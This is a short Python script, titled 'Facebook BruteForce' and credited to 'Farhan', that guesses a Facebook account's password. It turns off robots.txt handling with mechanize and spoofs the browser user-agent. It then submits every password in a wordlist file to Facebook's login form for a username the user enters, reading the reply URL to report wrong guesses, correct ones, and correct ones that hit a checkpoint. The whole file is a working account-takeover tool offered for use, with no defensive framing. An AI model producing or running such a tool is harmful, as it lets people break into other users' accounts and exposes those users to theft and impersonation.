import mechanize
import time
class colors:
    RED = '\033[31m'
print("\n\t---------- Welcome To Facebook BruteForce ----------\n")
print("Developed By: Farhan")
br = mechanize.Browser()
br.set_handle_robots(False)
passwords = open("wordlist.txt", "r")
email = input("Username/Email: ")
for x in passwords:
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Fire fox')]
    br.open('https://www.facebook.com/')
    br.select_form(nr= 0)
    br.form['email'] = email
    br.form['pass'] = x
    sub = br.submit()
    if sub.geturl() == "https://www.facebook.com/login/":
        print("Incorect Password " + x)

    elif sub.geturl() == "https://www.facebook.com/checkpoint/?next":
        print("correct password is " + x)
        print("\n")
        print("account is in checkpoint")

    else:
        print("Corect password is " + x)

        break
